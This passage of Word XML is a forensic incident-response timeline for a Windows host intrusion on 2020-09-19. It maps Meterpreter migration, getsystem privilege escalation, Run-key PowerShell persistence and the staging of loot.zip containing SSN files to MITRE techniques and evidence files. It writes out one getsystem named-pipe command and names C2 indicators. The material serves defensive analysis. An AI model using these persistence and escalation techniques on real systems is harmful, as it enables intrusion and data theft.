            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch LastRun 03:40:49; psscan PID 8324 03:40:49-03:43:10; flow port 50875</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1071</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#22</w:t>
              <w:br/>
              <w:t>volatility/windows.psscan.PsScan.jsonl#167</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution / defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Mark-of-the-Web removed from coreupdater.exe at launch (SmartScreen check)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN StreamChange on MFT 26213 (System32\coreupdater.exe) at 03:40:49.317 coincides with execution and SmartScreen checkappexec.microsoft.com TLS (pcap 02:40:49); Zone.Identifier absent from $MFT at acquisition.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1553.005 T1204.002</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36064</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_tls.jsonl#16333</w:t>
              <w:br/>
              <w:t>mftecmd_mft/mft.csv#27972</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:41:06</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>execution / persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Interactive cmd.exe opened by Administrator; sc.exe at 03:42:42 creates service</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>UserAssist Command Prompt.lnk/cmd.exe 03:41:06 (focus 3m35s), CMD prefetch; SC.EXE prefetch 03:42:42.66 coincides with 7045 coreupdater.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1059.003 T1543.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAssist.csv#41</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#125</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Service "coreupdater" installed (auto start, LocalSystem)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>7045 RecordID 958 ImagePath C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1543.003</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>defense evasion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>coreupdater.exe (PID 8324) exits after Meterpreter migration into spoolsv.exe (PID 2188, SYSTEM)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>psscan: coreupdater.ex PID 8324 (PPID 4008 explorer) 03:40:49 → exit 03:43:10. Memory at 05:10: spoolsv.exe PID 2188 (started at boot 01:24:09) holds a private PAGE_EXECUTE_READWRITE VadS region 0x1840000 beginning with an MZ header (malfind), a process handle to lsass.exe PID 656, and the C2 socket 10.42.85.115:50875 → 203.78.103.109:443 ESTABLISHED that was opened by coreupdater at 03:40:49 (pcap flow 50875 continues to end of capture, 280 KB up / 1.76 MB down). SRUM still attributes traffic to coreupdater.exe in the 04:14 and 05:14 slots. The exact migrate time is not logged; it lies between 03:40:49 and 03:43:10 (exit just before the getsystem service at 03:43:14).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1055 T1055.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#167</w:t>
              <w:br/>
              <w:t>volatility/windows.malware.malfind.Malfind.jsonl#1</w:t>
              <w:br/>
              <w:t>volatility/windows.handles.Handles.jsonl#14206</w:t>
              <w:br/>
              <w:t>volatility/windows.netscan.NetScan.jsonl#110</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
              <w:br/>
              <w:t>srumecmd/20261025191812_SrumECmd_NetworkUsages_Output.csv#193</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>privilege escalation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Meterpreter getsystem service "nehgye"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>7045 RecordID 959 cmd.exe /c echo nehgye &gt; \\.\pipe\nehgye; cmd prefetch run 03:43:14.99</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1134.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#17</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM Run "coreupdate" + registry payload HKLM\Software\q9Z1bssi written (fileless persistence)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>HKLM\...\CurrentVersion\Run LastWrite 03:44:03.540241: value coreupdate runs hidden PowerShell that iex's base64 from HKLM\Software\q9Z1bssi\JqxNhWJA (Metasploit registry_persistence), 49 s after getsystem.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1547.001 T1112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7223</w:t>
              <w:br/>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:45:34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Administrator opens mortysmith's sensitive files (SSN, Plans, Portal_gun.png)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Notepad/Photos open My Social Security Number.txt (03:45:34), Plans.txt (03:45:39), Portal_gun.png (03:45:53); Thoughts.txt at 03:47:39.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1005</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lecmd/lnk_F.csv#13</w:t>
              <w:br/>
              <w:t>lecmd/lnk_F.csv#14</w:t>
              <w:br/>
              <w:t>lecmd/lnk_F.csv#15</w:t>
              <w:br/>
              <w:t>pecmd/prefetch_0.csv#79</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>collection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Explorer zip "My Social Security Number.zip" created in mortysmith\Documents, renamed loot.zip at 03:46:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Explorer "Send to compressed folder" pattern (~RF*.TMP swap), MFT 87470-2. The file was renamed to loot.zip at 03:46:18.069 and permanently deleted at 03:47:09.917 without going through the Recycle Bin. The MFT entry was reused by Thoughts.lnk at 03:47:39.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1560.001 T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36753</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>collection / anti-forensics</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Archive staged as loot.zip in mortysmith\Documents (deleted 03:47:09)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>My Social Security Number.zip created 03:46:15 via Explorer compressed folder, renamed loot.zip 03:46:18, LNK loot.lnk; FileDelete 03:47:09.92.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1560.001 T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36776</w:t>
              <w:br/>
              <w:t>lecmd/lnk_F.csv#12</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36805</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:46:18</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>loot.zip opened/accessed (ObjectId + loot.lnk) during live Meterpreter C2 session — probable exfil window until deletion 03:47:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN ObjectIdChange on loot.zip (MFT 87470) and creation of Recent\loot.lnk at 03:46:18.129; archive deleted 03:47:09.917. During this window the coreupdater/spoolsv Meterpreter session to 203.78.103.109:443 (flow port 50875, 280 KB total upstream) was active; no local copy observed.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1041</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36778</w:t>
              <w:br/>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36780</w:t>
              <w:br/>
              <w:t>suricata/case001.pcap/eve_flow.jsonl#29788</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:49:46</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>discovery</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Administrator browses ricksanchez profile folders (Desktop/Documents/Downloads) after mortysmith and Admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>ShellBags in the Administrator UsrClass: Admin profile folders 03:45:07-03:45:19, mortysmith folders 03:45:29-03:49:12, ricksanchez folders 03:49:46-03:51:14, last Explorer focus 03:51:53. The session logged off at 03:52:13.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1083</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sbecmd/Administrator_UsrClass.csv#31</w:t>
              <w:br/>
              <w:t>sbecmd/Administrator_UsrClass.csv#29</w:t>
              <w:br/>
              <w:t>sbecmd/Administrator_UsrClass.csv#19</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>lateral movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C137\Administrator logs off RDP session 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>4647 user-initiated logoff LogonId 0x857E73, 4634 type 3 0x842184, LSM 23/40/24 session 3 (source 10.42.85.10). End of interactive attacker session (03:36:24–03:52:13).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>T1021.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39812</w:t>
              <w:br/>
              <w:t>evtxecmd/evtxecmd_0.csv#39819</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1871"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C137\ricksanchez (Domain Admin) logs on locally (type 11 cached / type 7 unlock) — trigger for HKLM Run persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5386"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Security 4624 LogonType 11 (05:08:15.22) and LogonType 7 (05:08:15.42) for C137\ricksanchez on DESKTOP-SDN1RPT. Explorer startup processes HKLM\...\Run\coreupdate: powershell PID 508 (PPID 1380) created 05:08:37, spawns PID 3316 at 05:08:43 (reflective Meterpreter). This logon is most likely the responder's/user's session preceding the acquisition at 05:08:58 (USB insertion).</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
